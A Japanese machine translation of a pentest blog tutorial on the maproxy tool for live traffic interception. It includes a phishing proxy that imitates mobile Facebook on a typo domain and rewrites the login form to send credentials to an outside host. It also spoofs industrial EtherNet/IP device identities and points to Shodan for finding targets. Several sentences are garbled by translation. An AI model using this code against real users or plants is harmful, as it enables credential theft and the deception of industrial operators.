オンザフライでのネットワークデータ処理

記事の翻訳は、ペンテストの開始前に準備されました。侵入テストの練習。」




注釈


通常の侵入テストやRed Teamの運用からIoT / ICSデバイスやSCADAのハッキングに至るまで、さまざまなタイプのセキュリティ評価とは、バイナリネットワークプロトコルでの作業、つまりクライアントとターゲット間のネットワークデータの傍受と変更を意味します。 Wireshark、Tcpdump、Scapyなどのツールがあるため、ネットワークトラフィックのスニッフィングは難しい作業ではありませんが、ネットワークデータの読み取り、フィルタリング、変更、オンザフライでの送信には独自のインターフェイスが必要になるため、変更には時間がかかるようです。ターゲットホストにほぼリアルタイムで。さらに、このようなツールが複数の並列接続で自動的に機能し、スクリプトを使用してカスタマイズできる機能が理想的です。

と呼ばれるツールを見つけたらmaproxy、ドキュメントからすぐにそれがわかりましたmaproxy-必要なものだけです。これは、かなりシンプルで用途が広く、TCPプロキシの設定が簡単です。このツールをICSデバイス（多くのパッケージを生成する）を含むいくつかのかなり複雑なアプリケーションでテストして、多くの並列接続で機能するかどうかを確認しました。

この記事では、を使用したオンザフライでのネットワークデータの処理について紹介しますmaproxy。

概観


このツールはmaproxy、人気があり十分に開発された非同期PythonネットワークフレームワークであるTornadoに基づいています。

一般に、これはいくつかのモードで機能します。

  • TCP:TCP -暗号化されていないTCP接続。
  • TCP:SSLそしてSSL:TCP-一方向の暗号化で;
  • SSL:SSL -双方向暗号化。

ライブラリとして付属しています。クイックスタートでは、ライブラリの主な機能を反映したサンプルファイルを使用できます。

  • all.py
  • certificate.pem
  • logging_proxy.py
  • privatekey.pem
  • ssl2ssl.py
  • ssl2tcp.py
  • tcp2ssl.py
  • tcp2tcp.py

ケース1-単純な双方向プロキシ


に基づいてtcp2tcp.py：

#!/usr/bin/env python

import tornado.ioloop
import maproxy.proxyserver

server = maproxy.proxyserver.ProxyServer("localhost",22)
server.listen(2222)
tornado.ioloop.IOLoop.instance().start()

デフォルトでProxyServer()は、接続場所と宛先ポートの2つの引数を取ります。server.listen()引数を1つ取ります-着信接続をリッスンするためのポート。

スクリプトの実行：

# python tcp2tcp.py

テストを実行するために、2222/tcpポートをリッスンして標準の22/tcpSSHサーバーポートに接続するプロキシスクリプトを介してローカルSSHサーバーに接続します。



ウェルカムバナーは、サンプルスクリプトがネットワークトラフィックを正常にプロキシしたことを通知します。

ケース2-データ変更


別のデモスクリプトはlogging_proxy.py、ネットワークデータの操作に最適です。ファイル内のコメントは、目的を達成するために変更できるクラスメソッドを説明しています。



ここで最も興味深いものは、

  • on_c2p_done_read -クライアントからサーバーへの途中でデータを傍受する
  • on_p2s_done_read -逆。

サーバーがクライアントに返すSSHバナーを変更してみましょう。

[…]
def on_p2s_done_read(self,data):
data = data.replace("OpenSSH", "DumnySSH")
super(LoggingSession,self).on_p2s_done_read(data)
[…]
server = maproxy.proxyserver.ProxyServer("localhost",22)
server.listen(2222)
[…]

スクリプトを実行します。



ご覧のように、SSHサーバーの名前がに変更されたため、クライアントは誤解されました«DumnySSH»。



ケース3-単純なフィッシングWebページ


このツールの用途は無数にあります。今回は、Red Teamの運用領域からより実用的なものに焦点を当てましょう。ランディングを模倣して、m.facebook.comたとえば意図的なタイプミスのあるカスタムドメインを使用してみましょうm.facebok.com。デモの目的で、ドメインが私たちによって登録されていると単純に仮定してください。

被害者のプロキシとFacebookサーバー用のSSLストリーム（31.13.81.36）との暗号化されていないネットワーク接続を確立します。この例を機能させるには、HTTPホストヘッダーを置き換えて正しいホスト名を実装する必要があります。また、コンテンツに簡単にアクセスできるように、応答の圧縮を無効にします。最後に、HTMLフォームを置き換えて、Facebookサーバーではなくログイン認証情報が送信されるようにします。

def on_c2p_done_read(self,data):
 # replace Host header
data = data.replace("Host: m.facebok.com", "Host: m.facebook.com")
# disable compression
data = data.replace("gzip", "identity;q=0")
data = data.replace("deflate", "")
super(LoggingSession,self).on_c2p_done_read(data)

 def on_p2s_done_read(self,data):
 # partial replacement of response
     data = data.replace("action=\"/login/", "action=\"https://redteam.pl/")

server = maproxy.proxyserver.ProxyServer("31.13.81.36",443, session_factory=LoggingSessionFactory(), server_ssl_options=True)

ケース4-イーサネット/ IPポート


私はかなり以前から、プログラマブルコントローラ（PLC）、入力/出力モジュール、ドライブ、リレー、ラダープログラミング環境などの産業用デバイスおよびソフトウェア（ICS / SCADA）を扱ってきました。このケースは、産業のものを好む人のためのものです。このようなソリューションのハッキングには、ネットワークプロトコルを使用したアクティブなゲームが含まれます。次の例では、ICS / SCADAネットワークトラフィックを変更する方法を示します。

これを行うには、次のものが必要です。

  • Wiresharkなどのネットワークスニファ。
  • イーサネット/ IPまたはSIPデバイスのみ、Shodanサービスを使用してそれを見つけることができます。
  • 私たちのスクリプトベースmaproxy。

まず、典型的なCIP（Common Industrial Protocol）の応答がどのように見えるかを見てみましょう



。デバイスは、産業用のイーサネットプロトコルの拡張バージョンであるイーサネット/ IPプロトコルを使用して識別され、CIPなどの制御プロトコルをラップします。強調表示された識別名を変更します。これは、プロキシスクリプトを使用して、「NI-IndComm for Ethernet」のスクリーンショットで確認できます。スクリプトlogging_proxy.pyを再利用し、クラスメソッドを同様に変更on_p2s_done_readすることができます。これは、クライアントで異なる識別名を表示するためです。

コード：

[…]
 def on_p2s_done_read(self,data):
 # partial replacement of response

 # Checking if we got List Identity message response
     if data[26:28] == b'\x0c\x00':
         print('Got response, replacing')
         data = data[:63] + 'DUMMY31337'.encode('utf-8') + data[63+10:]
     super(LoggingSession,self).on_p2s_done_read(data)
[…]
server = maproxy.proxyserver.ProxyServer("1.3.3.7",44818,session_factory=LoggingSessionFactory())
server.listen(44818)
[…]

実際、デバイスの識別を2回要求しました。2番目の回答は元の回答であり、最初の回答はその場で変更されました。

そして最後


私の意見ではmaproxy、Pythonでも記述された便利でシンプルなツールなので、その使用からもメリットを得られると思います。もちろん、ネットワークデータを処理および変更するためのより洗練されたツールがありますが、それらはまた、より多くの注意を必要とし、通常、特定のユースケース、たとえば3番目のケースと同様のケースではMuraena、Modlishkaまたはevilginx、または最後のケースではカナッペ用に作成されます。それの助けを借りて、一つの方法または別の、maproxyサンプルスクリプトは非常に明確であるので、あなたはすぐに、ネットワークデータを傍受するためのアイデアを実現することができます。
